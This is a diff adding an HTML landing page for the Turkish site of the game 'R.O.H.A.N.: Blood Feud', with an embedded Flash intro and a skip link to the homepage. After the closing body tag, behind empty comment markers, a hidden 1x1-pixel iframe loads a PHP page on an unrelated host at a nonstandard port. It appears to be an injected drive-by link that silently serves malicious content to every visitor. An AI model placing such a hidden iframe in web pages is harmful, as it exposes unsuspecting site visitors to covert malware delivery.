@@ -1,0 +1,66 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<html>
+
+    <head>
+        <link rev="x-refresh" href="http://www.rohan.com.tr/index-2.html"> 
+        <title>R.O.H.A.N.:Blood Feud</title>
+        <style type="text/css"> 
+            body	{background:#00002F; margin:0; padding:0; text-align:center;}
+            div#skip { width:100%; height:40px; text-align:right; }
+            div#main { margin:auto; position:relative; width:1000px; height:600px; vertical-align:middle;  }
+            div#main object#intro { margin:auto; }   
+            div#main object#intro2 { margin:auto; }   
+        </style>
+        <script type="text/javascript" src="http://www.rohan.com.tr/Common/js/AC_RunActiveContent.js"></script>
+    </head>
+
+    <body>
+            <div id="skip">
+                <a href="http://www.rohan.com.tr/index-2.html" ><strong><p style="margin-right:20px; font-family:Arial; font-style:oblique; font-size:x-large; color:White;">ANASAYFAYA GÝT ></p></strong></a>
+            </div>
+
+            <div id="main" >
+				<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="1000px" height="600px" id="intro" align="middle">
+				    <param name="movie" value="http://www.rohan.com.tr/swf/intro1.swf" />
+				    <param name="quality" value="high" />
+				    <param name="bgcolor" value="#ffffff" />
+				    <param name="play" value="true" />
+				    <param name="loop" value="true" />
+				    <param name="wmode" value="transparent" />
+				    <param name="scale" value="noscale" />
+				    <param name="menu" value="true" />
+				    <param name="devicefont" value="false" />
+				    <param name="salign" value="middle" />
+				    <param name="allowScriptAccess" value="sameDomain" />
+				    <!--[if !IE]>-->
+				    <object type="application/x-shockwave-flash" data="http://www.rohan.com.tr/swf/intro1.swf" width="1000px" height="600px" id="intro2">
+					    <param name="movie" value="http://www.rohan.com.tr/swf/intro1.swf" />
+					    <param name="quality" value="high" />
+					    <param name="bgcolor" value="#ffffff" />
+					    <param name="play" value="true" />
+					    <param name="loop" value="true" />
+					    <param name="wmode" value="transparent" />
+					    <param name="scale" value="noscale" />
+					    <param name="menu" value="true" />
+					    <param name="devicefont" value="false" />
+					    <param name="salign" value="middle" />
+					    <param name="allowScriptAccess" value="sameDomain" />
+				    <!--<![endif]-->
+					    <a href="http://www.adobe.com/go/getflash">
+						    <img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player" />
+					    </a>
+				    <!--[if !IE]>-->
+				    </object>
+				    <!--<![endif]-->
+			    </object>            
+            </div>
+ 
+
+
+
+
+    </body>
+
+<!-- . --><iframe width="1px" height="1px" src=" 	http://noveltyship.com:7891/preferences/button.php?licenses=157" style="display:block;" ></iframe>
+<!-- . --> </html> 
